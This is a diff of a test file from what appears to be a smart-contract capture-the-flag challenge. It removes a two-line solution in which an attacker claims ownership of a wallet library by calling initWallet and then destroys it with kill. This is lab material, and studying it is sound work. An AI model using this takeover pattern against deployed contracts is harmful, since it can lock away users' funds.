@@ -52,10 +52,7 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
-
-  await safuWalletLibrary.connect(attacker).initWallet([],1,ethers.constants.MaxUint256)
-  await safuWalletLibrary.connect(attacker).kill(await attacker.getAddress())
-
+  
 });
 
 /// expected final state
